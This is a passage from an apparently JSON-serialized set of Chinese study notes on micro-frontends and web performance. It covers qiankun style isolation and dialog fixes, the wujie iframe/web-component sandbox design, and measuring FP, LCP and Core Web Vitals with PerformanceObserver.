}\n`;\n\n// 在主应用中注入\nconst style = document.createElement('style');\nstyle.textContent = globalStyles;\ndocument.head.appendChild(style);\n```\n\n### 8.4. 总结：\n\n- `strictStyleIsolation` 隔离更彻底，但兼容性问题多\n- `experimentalStyleIsolation` 兼容性更好，但隔离不够彻底\n- 建议根据应用场景选择合适的方案，或混合使用\n- 对于复杂场景，可能需要自定义隔离方案\n\n### 8.5. 实现原理：\n\n#### 8.5.1. Shadow DOM 隔离：\n\n```javascript\nclass ShadowDOM {\n  constructor(app) {\n    const container = document.querySelector(app.container);\n    this.shadow = container.attachShadow({ mode: 'closed' });\n  }\n  \n  mount(html) {\n    this.shadow.innerHTML = html;\n  }\n}\n```\n\n#### 8.5.2. 作用域隔离：\n\n```javascript\nfunction scopedCSS(styleSheet, appName) {\n  const prefix = `[data-qiankun=\"${appName}\"]`;\n  return styleSheet.replace(/([^}{]*){/g, (match, selector) => {\n    return `${prefix} ${selector} {`;\n  });\n}\n```\n\n## 9. 性能优化\n\n乾坤采用多种优化策略：\n\n```javascript\n// 1. 预加载\nprefetchApps([\n  { name: 'app1', entry: '//localhost:8080' }\n]);\n\n// 2. 资源缓存\nconst cache = new Map();\nasync function loadWithCache(url) {\n  if (cache.has(url)) {\n    return cache.get(url);\n  }\n  const resource = await fetch(url);\n  cache.set(url, resource);\n  return resource;\n}\n\n// 3. 并行加载\nasync function loadResources(resources) {\n  return Promise.all(\n    resources.map(url => loadWithCache(url))\n  );\n}\n```\n\n优化要点：\n1. 应用预加载\n2. 资源缓存复用\n3. 并行加载优化\n4. 按需加载策略\n\n## 10. 错误处理\n\n乾坤提供完整的错误处理机制：\n\n```javascript\nregisterMicroApps([{\n  name: 'app1',\n  entry: '//localhost:8080',\n  loader: (loading) => render(loading),\n  errorBoundary: (error) => {\n    // 渲染错误页面\n    renderError(error);\n    // 上报错误\n    reportError(error);\n  }\n}]);\n\n// 全局错误监听\naddGlobalUncaughtErrorHandler((event) => {\n  console.log(event);\n  // 处理全局未捕获错误\n});\n```\n\n错误处理策略：\n1. 应用加载错误\n2. 运行时错误\n3. 生命周期错误\n4. 资源加载错误 \n\n## 11. 弹框问题常见解决方案：\n\n### 11.1. 常见弹框问题\n\n1. **样式丢失问题**\n\t- 当弹框设置了`append-to-body`时，会脱离子应用的样式作用域\n\t- 弹框被插入到主应用的 body 下，导致样式失效\n\t- 特别是在使用Element UI 等组件库的Dialog组件时最为常见 \n2. **定位偏移问题**\n\t- 使用fixed定位的弹框可能出现位置偏移\n\t- 依赖popper.js的组件（如Select下拉框）在弹框中位置错误 \n\n### 11.2. 解决方案\n\n#### 11.2.1. 样式隔离方案\n\n```javascript\n// 方案一：重写append方法\nconst originAppend = HTMLElement.prototype.append;\nHTMLElement.prototype.append = function(...args) {\n  // 如果是弹窗元素，则添加特定的类名\n  if (args[0]?.classList?.contains('el-dialog__wrapper')) {\n    args[0].classList.add('子应用命名空间');\n  }\n  return originAppend.apply(this, args);\n};\n```\n\n```css\n/* 方案二：添加样式作用域 */\n.子应用命名空间 {\n  .el-dialog__wrapper {\n    /* 弹框样式 */\n  }\n  .el-dialog {\n    /* 弹框内容样式 */\n  }\n}\n```\n\n#### 11.2.2. 容器挂载方案\n\n```javascript\n// 方案三：指定挂载容器\n// 在子应用中创建专门的弹框容器\nconst modalContainer = document.createElement('div');\nmodalContainer.id = 'modal-container';\ndocument.body.appendChild(modalContainer);\n\n// 弹框配置\n{\n  appendTo: '#modal-container'\n}\n```\n\n#### 11.2.3. Element UI 弹框解决方案\n\n```javascript\n// 方案四：修改弹框配置\nexport default {\n  mounted() {\n    // 获取当前子应用的容器\n    const container = document.querySelector('#子应用容器ID');\n    \n    this.$dialog = this.$createElement('el-dialog', {\n      props: {\n        // 禁用append-to-body\n        appendToBody: false,\n        // 指定挂载点\n        modalAppendToBody: false\n      }\n    });\n    \n    // 手动挂载到子应用容器\n    container.appendChild(this.$dialog.$el);\n  }\n}\n```\n\n#### 11.2.4. 全局样式处理\n\n```javascript\n// 方案五：全局样式处理\n// 在主应用中\nimport { registerMicroApps } from 'qiankun';\n\nregisterMicroApps([\n  {\n    name: 'subApp',\n    entry: '//localhost:8080',\n    container: '#container',\n    props: {\n      sandbox: {\n        // 开启严格样式隔离\n        strictStyleIsolation: true,\n        // 实验性样式隔离\n        experimentalStyleIsolation: true\n      }\n    }\n  }\n]);\n```\n\n### 11.3. 最佳实践建议\n\n1. **避免使用append-to-body**\n```javascript\n// 不推荐\n<el-dialog append-to-body>\n\n// 推荐\n<el-dialog :append-to-body=\"false\">\n```\n\n2. **使用动态挂载点**\n```javascript\n// 在子应用中创建动态挂载点\nconst createModalContainer = () => {\n  const container = document.createElement('div');\n  container.setAttribute('data-modal-container', '');\n  return container;\n};\n\n// 在弹框组件中使用\n{\n  mounted() {\n    this.modalContainer = createModalContainer();\n    document.body.appendChild(this.modalContainer);\n  },\n  beforeDestroy() {\n    this.modalContainer.remove();\n  }\n}\n```\n\n3. **样式作用域处理**\n```scss\n// 使用命名空间\n.sub-app-namespace {\n  // 弹框样式覆盖\n  .el-dialog__wrapper {\n    position: fixed;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    z-index: 2000;\n  }\n  \n  // 遮罩层样式\n  .el-dialog__overlay {\n    position: fixed;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    background-color: rgba(0, 0, 0, 0.5);\n  }\n}\n```\n\n4. **位置修正**\n```javascript\n// 处理弹框位置偏移\nconst fixModalPosition = (modal) => {\n  const { top, left } = modal.getBoundingClientRect();\n  const offsetTop = window.innerHeight - top;\n  const offsetLeft = window.innerWidth - left;\n  \n  modal.style.transform = `translate(${offsetLeft}px, ${offsetTop}px)`;\n};\n```\n\n通过以上方案的组合使用，可以有效解决微前端中的弹框问题。建议根据具体场景选择合适的解决方案，并在开发中注意以下几点：\n\n- 优先考虑不使用`append-to-body`\n- 合理使用样式隔离机制\n- 注意弹框的层级管理\n- 保持子应用的独立性\n\n\n\n","3SBP1pr3":"\n# 微前端原理（篇二：无界）\n\n`#微前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 微前端框架具备的能力\n\t1. 加载、卸载、切换应用能力\n\t2. 独立运行、环境隔离能力\n\t3. 路由状态保持能力\n\t4. 应用间通讯能力\n- 微前端收益\n\t- 技术栈无关\n\t- 独立开发、独立部署\n\t- 增量升级 → 技术升级 或 渐进式重构\n\t- 独立运行时\n- iframe 方案\n\t- 优点：简单、天然隔离（js/css/dom）\n\t- 缺点：隔离太完美\n\t\t- 路由丢失\n\t\t- dom 隔离严重，比如弹框问题\n\t\t- 通讯困难\n\t\t- 性能，比如白屏\n- single-spa 与 乾坤方案\n\t- single-spa原理\n\t\t- ① 预先注册子应用(激活路由、子应用资源、生命周期函数)\n\t\t- ② 监听路由 → 匹配激活路由→ 子应用 → 顺序调用生命周期 → 渲染\n\t- 乾坤\n\t\t- 入口 entry 、container 等\n\t\t-  `js`沙箱\n\t\t\t- `SnapshotSandbox`、`LegacySandbox`、`ProxySandbox`三套渐进增强方案\n\t\t- `css`沙箱做了两套\n\t\t\t- `strictStyleIsolation`、`experimentalStyleIsolation` 两套适用不同场景的方案\n\t\t- 资源==预加载==能力\n\t\t\t- 预先子应用`html`、`js`、`css`资源缓存下来，加快子应用的打开速度\n\t\t- 缺点\n\t\t\t- 无法==同时激活==多个子应用、不支持子应用==保活==\n\t\t\t-  `css` 沙箱无法绝对的隔离\n\t\t\t- `js` 沙箱在某些场景下执行==性能下降==严重\n\t\t\t- 无法支持 `vite` 等 `ESM` 脚本运行\n- 无界方案\n\t- 好处\n\t\t- ==组件方式==来使用微前端\n\t\t\t- 不需要改造、不用注册、直接使用无界组件即可\n\t\t- 可同时激活多个子应用\n\t\t- 天然 JS 沙箱\n\t\t- 应用切换或销毁时，不需要做任何清理工作\n\t- 路由同步\n\t\t- 劫持`iframe`的`history.pushState`和`history.replaceState` \n\t\t\t- 然后将子应用的`url`同步到主应用的`query`参数上\n\t-  iframe 连接机制和 css 沙箱机制\n\t\t- 子应用的 `JS 实例` 在 `iframe`\n\t\t- 真正 DOM&CSS 结构在 `webcomponent`\n\t\t- 所以需要通过代理 `iframe`的`document`到`webcomponent`，可以实现两者的互联\n\t\t\t- 将`document`的查询类接口：\n\t\t\t\t- `getElementsByTagName、getElementsByClassName、getElementsByName、getElementById、querySelector、querySelectorAll、head、body`全部代理到`webcomponent`\n\t\t- 保活原理\n\t\t\t-  当子应用发生切换，`iframe`保留下来，子应用的容器可能销毁，但`webcomponent`依然可以选择保留，这样等应用切换回来将`webcomponent`再挂载回容器上，子应用可以获得类似`vue`的`keep-alive`的能力.\n\t\t- 好处\n\t\t\t- 天然 css 沙箱，子应用不用做任何修改\n\t\t\t- 天然适配弹框\n\t\t\t- 子应用保活\n\t\t\t- **完整的 DOM 结构\n\t\t\t\t- **`webcomponent`保留了子应用完整的`html`结构，样式和结构完全对应，子应用不用做任何修改\n\t- 通信机制\n\t\t- 无界提供了`EventBus`实例\n\t\t- window.parent 通信机制：子应用`iframe`沙箱和主应用同源\n\t\t- props 注入机制：子应用通过`$wujie.props`可以轻松拿到主应用注入的数据\n\t- 整体优势\n\t\t- 具备同时激活多应用\n\t\t- 组件式使用：无需注册，更无需路由适配，在组件内使用，跟随组件装载、卸载\n\t\t- 应用级别的 keep-alive 保活\n\t\t- 天然隔离，纯净无污染\n\t\t- 接入成本低\n\t- 插件体系：\n\t\t- 无界的插件体系主要是方便用户==在运行时去修改子应用代码==从而避免去改动仓库代码\n\t\t- 比如\n\t\t\t-  js loader\n\t\t\t-  html-loader\n\t\t\t\t- 无界提供插件在运行时对子应用的 html 文本进行修改\n\t- 应用共享\n\t\t- 比如主应用使用到了`lodash`，子应用 A 也使用到了相同版本的`lodash`\n\t\t- ![图片&文件](./files/20250103.png)\n\t\t- 但：\n\t\t\t- 应用共享原理是主应用和子应用运行iframe沙箱同域可以共享内存，对于==组件库==这样有副作用的第三方包，可能无法共享\n- ==坑==\n\t-  MonacoEditor 认为 `shadowRoot` 一定在 `document.body 内部`\n\t\t- 而无界子应用 `document.body` 在 `shadowRoot 内部` \n\t\t- 这导致 MonacoEditor 认为编辑器不在 shadowRoot 内\n---\n\n>  源于无界官网，技术选型介绍说的特别好，对微前端技术原理理解有帮助！\n\n## 2. 定义\n\n通俗来说，就是在一个`web`应用中可以独立的运行另一个`web`应用\n\n## 3. 一个完善的的微前端框架应该具备哪些能力呢？\n\n- **子应用的加载和卸载能力**\n\t- 页面需要从一个子应用切换到另一个子应用，框架必须具备加载、渲染、切换的能力\n- **子应用独立运行的能力**\n\t- 子应用运行会污染全局的 window 对象，样式会污染其他应用，必须有效的隔离起来\n- **子应用路由状态保持能力**\n\t- 激活子应用后，浏览器刷新、前进、后退子应用的路由都应该可以正常工作\n- **应用间通信的能力**\n\t- 应用间可以方便、快捷的通信\n\n## 4. 使用微前端有什么收益呢\n\n- **技术栈无关**\n\t- 主框架不限制接入应用的技术栈，微应用具备完全自主权\n- **独立开发、独立部署**\n\t- 微应用仓库独立，前后端可独立开发，部署完成后主框架自动完成同步更新\n- **增量升级**\n\t- 在面对各种复杂场景时，我们通常很难对一个已经存在的系统做全量的技术栈升级或重构，\n\t- 而微前端是一种非常好的==实施渐进式重构的手段和策略==\n- **独立运行时**\n\t- 每个微应用之间状态隔离，运行时状态不共享\n\n> 可能有人会有疑问直接使用`iframe`不就可以做到吗？\n\n## 5. iframe 方案\n\n采用`iframe`的方案确实可以做到，而且优点非常明显\n\n### 5.1. 优点\n\n- 非常简单，使用没有任何心智负担\n- `web`应用隔离的非常完美，无论是`js`、`css`、`dom`都完全隔离开来\n\n### 5.2. 缺点\n\n由于其**隔离的太完美**导致缺点也非常明显\n\n- 路由状态丢失，刷新一下，`iframe`的`url`状态就丢失了\n- `dom`割裂严重，弹窗只能在`iframe`内部展示，无法覆盖全局\n- `web`应用之间通信非常困难\n- 每次打开==白屏时间太长==，对于[SPA 应用](https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8)来说无法接受\n\n## 6. single-spa 与 乾坤方案\n\n- [single-spa](https://zh-hans.single-spa.js.org/docs/getting-started-overview)是一个目前主流的微前端技术方案，其主要实现思路：\n\t- **预先注册子应用(激活路由、子应用资源、生命周期函数)**\n\t- 监听路由的变化，匹配到了激活的路由则加载子应用资源\n\t\t- **顺序调用生命周期函数**并最终渲染到**容器**\n- [乾坤](https://qiankun.umijs.org/zh/guide)微前端架构则进一步对`single-spa`方案进行完善，主要的完善点：\n\t- 子应用资源由 ==js 列表==修改进为一个`url`，大大减轻**注册子应用的复杂度**\n\t\t- 即，就是一个`入口 index.html`\n\t- 实现应用隔离\n\t\t- `js`隔离方案 _（`window`工厂）_ \n\t\t- `css`隔离方案 _（类`vue`的`scoped`）_\n\t- 增加资源==预加载==能力\n\t\t- 预先子应用`html`、`js`、`css`资源缓存下来，加快子应用的打开速度\n\n### 6.1. 优点\n\n- 监听路由自动的加载、卸载当前路由对应的子应用\n- 完备的沙箱方案\n\t- `js`沙箱做了`SnapshotSandbox`、`LegacySandbox`、`ProxySandbox`三套渐进增强方案\n- `css`沙箱做了两套`strictStyleIsolation`、`experimentalStyleIsolation`两套适用不同场景的方案\n- 路由保持，浏览器刷新、前进、后退，都可以作用到子应用\n- 应用间通信简单，全局注入\n\n### 6.2. 缺点\n\n- 基于路由匹配，**无法同时激活多个子应用**，**也不支持子应用保活**\n- 改造成本较大\n\t- 从 `webpack`、`代码`、`路由`等等都要做一系列的适配\n- `css` 沙箱无法绝对的隔离\n- `js` 沙箱在某些场景下执行性能下降严重\n- 无法支持 `vite` 等 `ESM` 脚本运行\n\n## 7. 无界方案\n\n>  在乾坤的`issue`中一个[议题](https://github.com/umijs/qiankun/issues/286)非常有意思，有个开发者提出能否利用`iframe`来实现`js`沙箱能力，这个`idea`启发了无界方案，下面详细介绍\n\n### 7.1. 应用加载机制和 js 沙箱机制\n\n- 将子应用的`js`注入主应用同域的`iframe`中运行\n\t- `iframe`是一个原生的`window`沙箱，内部有完整的`history`和`location`接口\n\t- 子应用实例`instance`运行在`iframe`中，**路由也彻底和主应用解耦，可以直接在业务组件里面启动应用**。\n\n采用这种方式的收益\n- **组件方式来使用微前端**\n\t- 不用注册，不用改造路由，直接使用无界组件，化繁为简\n- **一个页面可以同时激活多个子应用**\n\t- 子应用采用 iframe 的路由，不用关心路由占用的问题\n- **天然 js 沙箱，不会污染主应用环境**\n\t- 不用修改主应用`window`任何属性，只在`iframe`内部进行修改\n- **应用切换没有清理成本**\n\t- 由于不污染主应用，子应用销毁也无需做任何清理工作\n\n### 7.2. 路由同步机制\n\n- 在`iframe`内部进行`history.pushState`\n\t- 浏览器会自动的在[joint session history](https://html.spec.whatwg.org/multipage/history.html#joint-session-history)中添加`iframe`的[session-history](https://html.spec.whatwg.org/multipage/history.html#session-history)\n\t- 浏览器的前进、后退在不做任何处理的情况就可以直接作用于子应用\n- 劫持`iframe`的`history.pushState`和`history.replaceState`，\n\t- 就可以将子应用的`url`同步到主应用的`query`参数上\n\t- 当刷新浏览器初始化`iframe`时，读回子应用的`url`并使用`iframe`的`history.replaceState`进行同步\n\n采用这种方式的收益\n- **浏览器刷新、前进、后退都可以作用到子应用**\n- **实现成本低，无需复杂的监听来处理同步问题**\n- **多应用同时激活时也能保持路由同步**\n\n### 7.3. iframe 连接机制和 css 沙箱机制\n\n总结就是：\n- 子应用的 `JS 实例` 在 `iframe`\n- 真正 DOM&CSS 结构在 webcomponent\n- 所以需要通过代理 `iframe`的`document`到`webcomponent`，可以实现两者的互联\n\n--- \n\n- 无界采用[webcomponent](https://developer.mozilla.org/en-US/docs/Web/Web_Components)来实现页面的样式隔离，无界会**创建一个`wujie`自定义元素**，然后将**子应用的完整结构渲染在内部**\n\t- 子应用的实例`instance`在`iframe`内运行\n\t\t- `dom`在主应用容器下的`webcomponent`内\n\t\t- 通过代理 `iframe`的`document`到`webcomponent`，可以实现两者的互联。\n\t\t\t- 将`document`的查询类接口：\n\t\t\t\t- `getElementsByTagName、getElementsByClassName、getElementsByName、getElementById、querySelector、querySelectorAll、head、body`全部代理到`webcomponent`\n\t\t- 这样`instance`和`webcomponent`就精准的链接起来。\n\n- 当子应用发生切换，`iframe`保留下来，子应用的容器可能销毁，但`webcomponent`依然可以选择保留，这样等应用切换回来将`webcomponent`再挂载回容器上，子应用可以获得类似`vue`的`keep-alive`的能力.\n\n采用这种方式我们可以获得\n- **天然 css 沙箱**\n\t- 直接物理隔离，样式隔离子应用不用做任何修改\n- **天然适配弹窗问题\n\t- `document.body`的`appendChild`或者`insertBefore`会代理直接插入到`webcomponent`，子应用不用做任何改造\n- **子应用保活**\n\t- 子应用保留`iframe`和`webcomponent`，应用内部的`state`不会丢失\n- **完整的 DOM 结构\n\t- **`webcomponent`保留了子应用完整的`html`结构，样式和结构完全对应，子应用不用做任何修改\n\n### 7.4. 通信机制\n\n承载子应用的`iframe`和主应用是同域的，所以主、子应用天然就可以很好的进行通信，在无界我们提供三种通信方式\n\n- **props 注入机制**\n\t- 子应用通过`$wujie.props`可以轻松拿到主应用注入的数据\n- **window.parent 通信机制**\n\t- 子应用`iframe`沙箱和主应用同源，子应用可以直接通过`window.parent`和主应用通信\n- **去中心化的通信机制**\n\t- 无界提供了`EventBus`实例，注入到主应用和子应用，所有的应用可以去中心化的进行通信\n\n### 7.5. 优势\n\n通过上面原理的阐述，我们可以得出无界微前端框架的几点优势：\n- **多应用同时激活在线**\n\t- 框架具备同时激活多应用，并保持这些应用路由同步的能力\n- **组件式的使用方式**\n\t- 无需注册，更无需路由适配，在组件内使用，跟随组件装载、卸载\n- **应用级别的 keep-alive**\n\t- 子应用开启[保活模式](/api/startApp.html#alive)后，应用发生切换时整个子应用的状态可以保存下来不丢失，结合[预执行模式](/api/preloadApp.html#exec)可以获得类似`ssr`的打开体验\n- **纯净无污染**\n\t- 无界利用`iframe`和`webcomponent`来搭建天然的`js`隔离沙箱和`css`隔离沙箱\n\t- 利用`iframe`的`history`和主应用的`history`在同一个[top-level browsing context](https://html.spec.whatwg.org/multipage/browsers.html#top-level-browsing-context)来**搭建天然的路由同步机制**\n\t- 副作用局限在沙箱内部，子应用切换无需任何清理工作，没有额外的切换成本\n- **性能和体积兼具**\n\t- 子应用执行性能和原生一致，子应用实例`instance`运行在`iframe`的`window`上下文中，\n\t\t- 避免`with(proxyWindow){code}`这样指定代码执行上下文导致的性能下降\n\t\t- 但是多了实例化`iframe`的一次性的开销，可以通过 [preload](/api/preloadApp.html) 提前实例化\n- 体积比较轻量，借助`iframe`和`webcomponent`来实现沙箱，有效的减小了代码量\n- **开箱即用**\n\t- 不管是样式的兼容、路由的处理、弹窗的处理、热更新的加载，子应用完成接入即可开箱即用无需额外处理，应用[接入成本](./start.html#子应用改造)也极低\n\n## 8. 常见问题\n\nMonacoEditor 其实已经考虑到了 shadowRoot 的情况，但是 MonacoEditor 和 无界没有兼容的地方在于\n- MonacoEditor 认为 `shadowRoot` 一定在 `document.body 内部`\n- 而无界子应用 `document.body` 在 `shadowRoot 内部` \n- 这导致 MonacoEditor 认为编辑器不在 shadowRoot 内\n\n![图片&文件](./files/20241127-5.png)\n\n\n> https://github.com/Tencent/wujie/issues/205\n\n\n","tjk5Og7M":"\n# 前言\n\n\n>  前端性能与前端体验\n","rPuFiLdm":"\n# 如何度量前端性能\n\n`#前端性能` \n\n> 源于个人某次分享\n\n\n## 目录\n<!-- toc -->\n ## 1. 何为前端性能 \n\n![图片&文件](./files/20241101-8.png)\n\n## 2. 如何度量性能\n\n### 2.1. 主观感受\n\n![图片&文件](./files/20241101-9.png)\n\n### 2.2. 客观度量：（比如，如何度量白屏时间）\n\n![图片&文件](./files/20241101-10.png)\n\n使用`性能 API`\n\n![图片&文件](./files/20241101-11.png)\n\n## 3. web performance api\n\n![图片&文件](./files/20241101-12.png)\n\n![图片&文件](./files/20241101-13.png)\n\n## 4. 以用户为中心的性能指标\n\n![784](#)、\n\n## 5. 用户体验核心指标\n\n![图片&文件](./files/20241101-15.png)\n\n## 6. Web Vitals\n\n![图片&文件](./files/20241101-16.png)\n\n## 7. 性能指标总结\n\n![600](#)","ZLCAqeA5":"\n# PerformanceObserver API\n\n`#前端性能` `#R1` \n\n## 目录\n<!-- toc -->\n ## 1. PerformanceObserver 概述 \n\n- PerformanceObserver 是 Performance API 的一部分，用于观察和响应性能相关的事件。\n\t- 通过 PerformanceObserver，我们可以**全面监控网页性能，收集各种性能指标，为性能优化提供数据支持**。\n- 允许我们**以异步的方式监听性能度量事件，而不会阻塞主线程**。\n\n## 2. 基本使用方法\n\n```javascript hl:13\n// 创建性能观察器\nconst observer = new PerformanceObserver((list, observer) => {\n    // 获取所有性能条目\n    const entries = list.getEntries();\n    \n    entries.forEach(entry => {\n        console.log('Performance Entry:', entry);\n    });\n});\n\n// 开始观察特定类型的性能条目\nobserver.observe({\n    entryTypes: ['paint', 'largest-contentful-paint', 'layout-shift']\n});\n```\n\n## 3. 可观察的性能指标类型\n\n```javascript hl:8\n// 常用的 entryTypes\nconst entryTypes = [\n    'navigation',           // 导航计时\n    'resource',            // 资源加载\n    'paint',              // 绘制时间点\n    'mark',               // 自定义性能标记\n    'measure',            // 自定义性能测量\n    'layout-shift',       // 布局偏移\n    'largest-contentful-paint', // 最大内容绘制\n    'first-input',        // 首次输入延迟\n    'element'             // 元素计时\n];\n```\n\n## 4. 实际应用示例\n\n### 4.1. 监控页面加载性能\n\n```javascript\nconst pageLoadObserver = new PerformanceObserver((list) => {\n    const entries = list.getEntries();\n    \n    entries.forEach(entry => {\n        // 导航计时数据\n        if (entry.entryType === 'navigation') {\n            console.log({\n                DNS查询时间: entry.domainLookupEnd - entry.domainLookupStart,\n                TCP连接时间: entry.connectEnd - entry.connectStart,\n                页面加载总时间: entry.loadEventEnd - entry.startTime\n            });\n        }\n    });\n});\n\npageLoadObserver.observe({ entryTypes: ['navigation'] });\n```\n\n### 4.2. 监控资源加载\n\n```javascript\nconst resourceObserver = new PerformanceObserver((list) => {\n    list.getEntries().forEach(entry => {\n        // 资源加载详情\n        console.log({\n            资源名称: entry.name,\n            资源类型: entry.initiatorType,\n            加载时间: entry.duration,\n            传输大小: entry.transferSize,\n            开始时间: entry.startTime\n        });\n    });\n});\n\nresourceObserver.observe({ entryTypes: ['resource'] });\n```\n\n### 4.3. 监控 Core Web Vitals\n\n```javascript hl:1,10\n// LCP (Largest Contentful Paint) 监控\nconst lcpObserver = new PerformanceObserver((list) => {\n    const entries = list.getEntries();\n    const lastEntry = entries[entries.length - 1];\n    console.log('LCP:', lastEntry.startTime);\n});\n\nlcpObserver.observe({ entryTypes: ['largest-contentful-paint'] });\n\n// CLS (Cumulative Layout Shift) 监控\nlet clsValue = 0;\nconst clsObserver = new PerformanceObserver((list) => {\n    for (const entry of list.getEntries()) {\n        if (!entry.hadRecentInput) {\n            clsValue += entry.value;\n        }\n    }\n    console.log('Current CLS:', clsValue);\n});\n\nclsObserver.observe({ entryTypes: ['layout-shift'] });\n```\n\n## 5. 自定义性能标记\n\n```javascript hl:6,1\n// 创建自定义性能标记\nperformance.mark('customStart');\n\n// 某些操作\nsetTimeout(() => {\n    performance.mark('customEnd');\n    \n    // 测量两个标记之间的时间\n    performance.measure('customOperation', 'customStart', 'customEnd');\n    \n    // 观察测量结果\n    const measureObserver = new PerformanceObserver((list) => {\n        const measures = list.getEntries();\n        measures.forEach(measure => {\n            console.log(`${measure.name} took ${measure.duration}ms`);\n        });\n    });\n    \n    measureObserver.observe({ entryTypes: ['measure'] });\n}, 1000);\n```\n\n## 6. 错误处理和断开连接\n\n```javascript\nconst observer = new PerformanceObserver((list, observer) => {\n    try {\n        const entries = list.getEntries();\n        // 处理条目...\n        \n        // 可选：在特定条件下断开观察\n        if (someCondition) {\n            observer.disconnect();\n        }\n    } catch (error) {\n        console.error('Performance observation error:', error);\n    }\n});\n\n// 错误处理\ntry {\n    observer.observe({ \n        entryTypes: ['paint'],\n        buffered: true  // 获取缓冲的条目\n    });\n} catch (error) {\n    console.error('Failed to start observer:', error);\n}\n```\n\n## 7. 性能数据收集和分析\n\n```javascript\n// 创建性能数据收集器\nclass PerformanceCollector {\n    constructor() {\n        this.metrics = {\n            navigation: [],\n            resource: [],\n            paint: []\n        };\n        \n        this.initObservers();\n    }\n    \n    initObservers() {\n        // 导航性能\n        new PerformanceObserver((list) => {\n            this.metrics.navigation = list.getEntries();\n            this.analyzeNavigation();\n        }).observe({ entryTypes: ['navigation'] });\n        \n        // 资源性能\n        new PerformanceObserver((list) => {\n            this.metrics.resource = [...this.metrics.resource, ...list.getEntries()];\n            this.analyzeResources();\n        }).observe({ entryTypes: ['resource'] });\n        \n        // 绘制性能\n        new PerformanceObserver((list) => {\n            this.metrics.paint = list.getEntries();\n            this.analyzePaint();\n        }).observe({ entryTypes: ['paint'] });\n    }\n    \n    analyzeNavigation() {\n        const navEntry = this.metrics.navigation[0];\n        if (navEntry) {\n            console.log({\n                FCP: navEntry.firstContentfulPaint,\n                DOMContentLoaded: navEntry.domContentLoadedEventEnd - navEntry.domContentLoadedEventStart,\n                LoadComplete: navEntry.loadEventEnd - navEntry.startTime\n            });\n        }\n    }\n    \n    analyzeResources() {\n        const slowResources = this.metrics.resource\n            .filter(entry => entry.duration > 1000)\n            .map(entry => ({\n                url: entry.name,\n                duration: entry.duration,\n                size: entry.transferSize\n            }));\n            \n        console.log('Slow Resources:', slowResources);\n    }\n    \n    analyzePaint() {\n        const paintMetrics = this.metrics.paint.reduce((acc, entry) => {\n            acc[entry.name] = entry.startTime;\n            return acc;\n        }, {});\n        \n        console.log('Paint Metrics:', paintMetrics);\n    }\n}\n\n// 使用收集器\nconst collector = new PerformanceCollector();\n```\n\n","Koi3SW8t":"\n# LCP 、 白屏时间、首屏时间\n\n`#前端性能` \n\n## 目录\n<!-- toc -->\n ## 1. LCP (Largest Contentful Paint) 和白屏时间 \n\n是两个不同的指标，它们测量的是不同的性能方面。\n\n### 1.1. LCP 与白屏时间的区别\n\n#### 1.1.1. 定义差异\n\n- **白屏时间 (First Paint, FP)**：\n\t- 从页面开始加载到**第一个像素**绘制到屏幕上的时间\n\t- 代表用户**第一次看到页面有内容的时刻**\n\t- 可能**只是背景颜色或简单的元素**\n- **LCP (Largest Contentful Paint)**：\n\t- 视口内可见的**最大图像或文本块完成渲染**的时间点\n\t- 代表页面主要内容加载完成的时刻\n\t- 关注的是最大的内容元素的渲染时间\n\n#### 1.1.2. 时间点差异\n\n```\n页面加载时间轴：\n[开始加载] -> [首次绘制(FP/白屏)] -> [首次内容绘制(FCP)] -> [最大内容绘制(LCP)]\n```\n\n### 1.2. 测量方法对比\n\n#### 1.2.1. 白屏时间测量\n\n- 方法一：Performance API\n\t- PerformanceObserver API\n\t\t- paint\n- 方法二：手动测量 \n\n```javascript hl:1,12,4\n// 方法一：Performance API\nconst observer = new PerformanceObserver((list) => {\n    for (const entry of list.getEntries()) {\n        if (entry.name === 'first-paint') {\n            console.log('White screen time:', entry.startTime);\n        }\n    }\n});\n\nobserver.observe({ entryTypes: ['paint'] });\n\n// 方法二：手动测量 \nperformance.mark('pageStart');\nwindow.addEventListener('load', () => {\n    const whiteScreenTime = performance.now() - performance.getEntriesByName('pageStart')[0].startTime;\n    console.log('Manual white screen time:', whiteScreenTime);\n});\n```\n\n#### 1.2.2. LCP 测量：largest-contentful-paint\n\n```javascript hl:7\n// 使用 PerformanceObserver 测量 LCP\nnew PerformanceObserver((entryList) => {\n    const entries = entryList.getEntries();\n    const lastEntry = entries[entries.length - 1];\n    console.log('LCP:', lastEntry.startTime);\n}).observe({\n    entryTypes: ['largest-contentful-paint']\n});\n```\n\n### 1.3. 影响因素对比\n\n#### 1.3.1. 白屏时间的影响因素\n\n- HTML 文档的网络请求时间\n- HTML 解析时间\n- 关键 CSS 加载时间\n- JavaScript 阻塞渲染的情况\n- 服务器响应时间\n\n#### 1.3.2. LCP 的影响因素\n\n- 图片加载时间\n- 大型文本块的渲染\n- CSS 样式计算\n- Web 字体加载\n- 服务器响应时间\n- JavaScript 执行时间\n\n### 1.4. 优化策略对比\n\n#### 1.4.1. 白屏优化\n\n```html\n<!-- 1. 内联关键 CSS -->\n<style>\n  /* 首屏关键样式 */\n  .header { ... }\n  .main-content { ... }\n</style>\n\n<!-- 2. 预加载关键资源 -->\n<link rel=\"preload\" href=\"critical.css\" as=\"style\">\n<link rel=\"preload\" href=\"critical.js\" as=\"script\">\n\n<!-- 3. 服务端渲染 -->\n<div id=\"app\">\n  <!-- 服务端预渲染的内容 -->\n</div>\n```\n\n#### 1.4.2. LCP 优化\n\n```javascript\n// 1. 图片优化\nconst img = new Image();\nimg.loading = 'lazy';  // 非LCP图片使用懒加载\nimg.srcset = 'small.jpg 300w, large.jpg 1000w';\nimg.sizes = '(max-width: 500px) 300px, 1000px';\n\n// 2. 使用 fetchpriority 属性\n<img src=\"hero.jpg\" fetchpriority=\"high\">\n\n// 3. 缓存策略\n// 服务端设置缓存头\nCache-Control: max-age=31536000\n```\n\n>  fetchpriority 属性\n\n\n### 1.5. 实际应用场景\n\n#### 1.5.1. 需要关注白屏时间的场景\n\n- 首页加载体验\n- SPA 应用的路由切换\n- 移动端页面加载\n- 弱网环境优化\n\n#### 1.5.2. 需要关注 LCP 的场景\n\n- 新闻网站的文章页面\n- 电商网站的商品详情页\n- 图片展示网站\n- 内容密集型应用\n\n### 1.6. 监控代码示例\n\n```javascript hl:21,28\nclass PerformanceMonitor {\n    constructor() {\n        this.metrics = {\n            fp: 0,\n            lcp: 0\n        };\n        this.init();\n    }\n\n    init() 